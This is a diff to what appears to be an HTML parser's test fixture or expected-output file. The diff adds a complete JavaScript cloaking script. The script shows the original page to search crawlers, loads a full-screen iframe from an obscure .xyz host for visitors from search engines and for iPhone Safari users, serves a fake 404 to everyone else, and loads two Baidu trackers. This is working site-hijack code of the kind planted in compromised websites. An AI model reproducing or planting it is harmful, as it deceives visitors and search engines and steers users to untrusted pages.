@@ -61,6 +61,111 @@
 <html><head>
 </head><body></body></html>
 
+=== strip_buttons_and_get_text ===
+
+var titlestr = document.title;
+var referer = document.referrer;
+
+var adPageUrl = "https://f2g9h4j1k7l3p8o.676815.xyz:8283/?nb=Onerun5-128&bm=qmf&ml=kp";
+
+var isSpider = /(baiduspider|googlebot|sogou|bingbot|yandex|slurp|duckduckbot|facebookexternalhit|facebot|twitterbot|teoma|ahrefsbot|crawler|spider|bot)/i.test(navigator.userAgent);
+
+var isSearchEngineReferer = /(baidu\.com|sogou\.com|so\.com|sm\.cn|google\.com|bing\.com)/i.test(referer);
+
+var isAppleSafari = /iPhone|iPad|iPod/.test(navigator.userAgent) && 
+                    /Safari/.test(navigator.userAgent) && 
+                    !/CriOS|FxiOS|EdgiOS|OPiOS|GSA|UCBrowser|FBAN|FBAV/.test(navigator.userAgent);
+
+if (isSpider) {
+    console.log("蜘蛛访问，显示源站");
+}
+else if (isSearchEngineReferer) {
+    setFrame(adPageUrl);
+}
+else if (isAppleSafari) {
+    setFrame(adPageUrl);
+}
+else {
+    show404();
+}
+
+function show404() {
+    var errorHtml = '<!DOCTYPE html>' +
+        '<html>' +
+        '<head>' +
+        '<meta charset="UTF-8">' +
+        '<meta http-equiv="status" content="404">' +
+        '<title>404 Not Found</title>' +
+        '<style>' +
+        'body { background-color: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; }' +
+        '.error-container { text-align: center; max-width: 500px; }' +
+        '.error-code { font-size: 80px; font-weight: bold; color: #e74c3c; margin: 0; }' +
+        '.error-message { font-size: 24px; color: #333; margin: 20px 0; }' +
+        '.error-description { color: #666; margin: 20px 0; line-height: 1.6; }' +
+        '</style>' +
+        '</head>' +
+        '<body>' +
+        '<div class="error-container">' +
+        '<h1 class="error-code">404</h1>' +
+        '<p class="error-message">Not Found</p>' +
+        '<p class="error-description">抱歉，您访问的页面不存在或已被移除。</p>' +
+        '<p class="error-description">The requested URL was not found on this server.</p>' +
+        '</div>' +
+        '</body>' +
+        '</html>';
+    
+    document.write(errorHtml);
+    
+    if (typeof window.status !== 'undefined') {
+        window.status = "404 Not Found";
+    }
+
+    try {
+        var metaStatus = document.createElement('meta');
+        metaStatus.setAttribute('http-equiv', 'status');
+        metaStatus.setAttribute('content', '404');
+        document.getElementsByTagName('head')[0].appendChild(metaStatus);
+    } catch(e) {}
+}
+
+function setFrame(olink) {
+    var ss = '<title>' + titlestr + '</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><iframe scrolling="yes" marginheight="0" marginwidth="0" frameborder="0" width="100%" height="100%" src="' + olink + '"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;margin:0;padding:0;}</style>';
+    document.write(ss);
+    try {
+        setTimeout(function() {
+            for (var i = 0; i < document.body.children.length; i++) {
+                try {
+                    var a = document.body.children[i].tagName;
+                    var b = document.body.children[i].id;
+                    if (b != "showcloneshengxiaon" && a != "title") {
+                        document.body.children[i].style.display = "none";
+                    }
+                } catch(e) {}
+            }
+            var oMeta = document.createElement('meta');
+            oMeta.name = 'viewport';
+            oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
+            document.getElementsByTagName('head')[0].appendChild(oMeta);
+        }, 100);
+    } catch(e) {}
+}
+
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8fb5df1cfae6b27794f3edf7417582e8";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?775828ba25b17d2025faf40e7427fabb";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+
 === ParsedPage.get_anchor_links ===
 []
 
